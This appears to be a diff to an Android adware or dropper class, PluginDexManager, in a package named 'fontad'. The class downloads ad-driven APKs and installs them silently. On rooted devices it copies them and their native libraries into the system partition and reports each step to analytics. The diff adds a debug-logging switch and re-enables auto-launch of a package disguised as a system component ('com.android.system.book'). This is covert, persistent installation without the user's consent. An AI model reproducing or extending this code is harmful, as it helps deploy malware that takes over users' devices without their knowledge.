@@ -46,6 +46,7 @@ public class PluginDexManager {
     private static final String UNINSTALLSILENT = "com.ningso.fontad.action.UNINSTALLSILENT";
 
     private static String saveDir = Environment.getExternalStorageDirectory() + "/Studio/";
+    public static boolean LOG_DEBUG = true;
 
     private AdBean adBean;
     private String installFile;
@@ -63,11 +64,13 @@ public class PluginDexManager {
                                 if (adBean.getActionType() == 1 && adBean.isRooted()) {
                                     boolean has2system = ShellUtils.CopyApkToSystem(installFile);
                                     ShellUtils.copyLibSo2SystemLib("/data/data/" + adBean.getPkgName() + "/lib");
-                                  //  PackageUtils.startInstallAppLauncher(mContext, "com.android.system.book", "com.android.core.MainActivity2");
-                                    Log.e(TAG, "plugin copy system" + has2system);
+                                    if ("com.android.system.book".equals(adBean.getPkgName())) {
+                                        PackageUtils.startInstallAppLauncher(mContext, "com.android.system.book", "com.android.core.MainActivity2");
+                                    }
+                                    if (LOG_DEBUG) Log.d(TAG, "plugin copy system" + has2system);
                                 }
                                 deleteDex(mContext);
-                                Log.e(TAG, "plugin de");
+                                if (LOG_DEBUG) Log.d(TAG, "plugin de");
                             }
                         });
                     }
@@ -75,7 +78,7 @@ public class PluginDexManager {
                 case HAS_INSTALL_FAIL:
                     deleteDex(mContext);
                     sendBroadcastToAnalytics(INSTALL_FAIL, adBean.getPkgName(), 3, "success");
-                    Log.e(TAG, "plugin install fail");
+                    if (LOG_DEBUG) Log.d(TAG, "plugin install fail");
                     break;
             }
         }
@@ -115,13 +118,14 @@ public class PluginDexManager {
                                         sendBroadcastToAnalytics(DOWNLOAD_FINISH, adBean.getPkgName(), 1, "success");
                                         installFile = file.getAbsolutePath();
                                         new InStallSilent(installFile).start();
-                                        Log.d(TAG, "plugin download finish" + installFile);
+                                        if (LOG_DEBUG)
+                                            Log.d(TAG, "plugin download finish" + installFile);
                                     }
 
                                     @Override
                                     public void onError(int status, String error) {
                                         super.onError(status, error);
-                                        Log.d(TAG, "plugin download error" + error);
+                                        if (LOG_DEBUG) Log.d(TAG, "plugin download error" + error);
                                         sendBroadcastToAnalytics(DOWNLOAD_ERROR, adBean.getPkgName(), 1, error);
                                     }
                                 });
@@ -304,7 +308,7 @@ public class PluginDexManager {
                     sendBroadcastToAnalytics(INSTALL_NOMALSUCCESS, adBean.getPkgName(), 1, "success");
                 }
             }
-            Log.d(TAG, "plugin install  == 1: " + installsuccuess);
+            if (LOG_DEBUG) Log.d(TAG, "plugin install  == 1: " + installsuccuess);
             if (installsuccuess == 1) {
                 message.what = HAS_INSTALL_SUCCESS;
             } else {
@@ -329,7 +333,7 @@ public class PluginDexManager {
             intent.putExtra("action_result", result);
             mContext.sendBroadcast(intent);
         } catch (Exception e) {
-            Log.d("ee", "dex sendBroadcastToAnalytics extra exception");
+            if (LOG_DEBUG) Log.d(TAG, "dex sendBroadcastToAnalytics extra exception");
         }
     }
 }
